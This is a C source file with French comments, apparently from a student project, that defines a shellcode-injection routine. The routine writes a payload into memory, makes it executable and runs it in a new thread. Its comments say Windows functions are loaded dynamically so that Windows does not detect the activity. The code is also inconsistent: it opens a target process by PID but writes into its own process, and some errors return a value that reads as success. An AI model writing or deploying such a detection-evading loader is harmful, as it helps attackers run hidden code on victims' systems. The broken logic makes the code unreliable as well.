#include <windows.h>
#include <stdio.h>
#include "inject.h"
#include "utils.h"
#include <cassert>




BOOL InjectShellcode(LPVOID payload, SIZE_T payloadSize, DWORD processId , void* allocatedMemory) {

    // je recharge les DLL ici aussi pour évité les bugs 
    ChargeDLL dll = { 0 };
    if (!chargerLib(&dll)) {
        printf("Erreur : Impossible de charger les fonctions nécessaires.\n");
        return 1;
    }

    // On ouvre le processus qui est définie par le PID rentrée dans le fichier "projetArendre" 
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (hProcess == NULL) {
        printf("Échec. Code d'erreur: %lu\n", GetLastError());
        return FALSE;
    }

    // On utilise que les fonction personelle pour que windows ne détecte pas ce que l'ont fait 

    SIZE_T bytesWritten = 0;
    assert(dll.pWriteProcessMemory != NULL); // pour retirer l'erreur C6011
    if (!dll.pWriteProcessMemory(dll.pGetCurrentProcess(), allocatedMemory, payload, payloadSize, &bytesWritten)) {
        printf("Erreur : WriteProcessMemory a échoué (Code : %lu)\n", GetLastError());
        dll.pVirtualFree(allocatedMemory, 0, MEM_RELEASE);
        return 1;
    }

    // On modifie les droits pour pouvoir exécuter le code que l'on vient de placer
    DWORD oldProtect;
    if (!dll.pVirtualProtect(allocatedMemory, payloadSize, PAGE_EXECUTE_READ, &oldProtect)) {
        printf("Erreur : VirtualProtect a échoué (Code : %lu)\n", GetLastError());
        dll.pVirtualFree(allocatedMemory, 0, MEM_RELEASE);
        return 1;
    }


    // On exécute notre code placé 
    assert(dll.pCreateThread != NULL); 
    HANDLE hThread = dll.pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)allocatedMemory, NULL, 0, NULL);
    if (hThread == NULL) {
        printf("Erreur : CreateThread a échoué (Code : %lu)\n", GetLastError());
        dll.pVirtualFree(allocatedMemory, 0, MEM_RELEASE);
        return 1;
    }

    // Libérer les espaces mémoires 

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    dll.pVirtualFree(allocatedMemory, 0, MEM_RELEASE);

    return TRUE;
}
